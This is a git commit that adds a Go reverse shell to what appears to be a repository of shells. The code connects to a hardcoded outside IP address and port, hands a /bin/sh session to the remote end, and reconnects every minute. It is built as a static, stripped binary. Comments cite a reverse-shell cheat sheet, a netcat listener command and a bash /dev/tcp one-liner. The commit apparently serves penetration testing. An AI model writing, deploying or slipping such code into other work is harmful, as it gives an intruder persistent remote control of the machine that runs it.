4c849f24dfe728a7657d1f682afb3cad26ef0de1
Maksim Derbenev <maksim.derbenev@sbermarket.ru>
2023-06-07 23:03:28 +0300

    add go shell

---
+++ shells/go/shell.go
@@ -0,0 +1,37 @@
+//go:generate sh -c "CGO_ENABLED=0 go build -installsuffix netgo -tags netgo -ldflags \"-s -w -extldflags '-static'\" -o $DOLLAR(basename ${GOFILE} .go)`go env GOEXE` ${GOFILE}"
+//go:build !windows
+// +build !windows
+
+// Reverse Shell in Go
+// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+// Test with nc -lvvp 6666
+package main
+
+import (
+	"net"
+	"os/exec"
+	"time"
+)
+
+func main() {
+	reverse("80.87.107.88:12345")
+}
+
+// bash -i >& /dev/tcp/localhost/6666 0>&1
+func reverse(host string) {
+
+	c, err := net.Dial("tcp", host)
+	if nil != err {
+		if nil != c {
+			c.Close()
+		}
+		time.Sleep(time.Minute)
+		reverse(host)
+	}
+
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
+	reverse(host)
+}
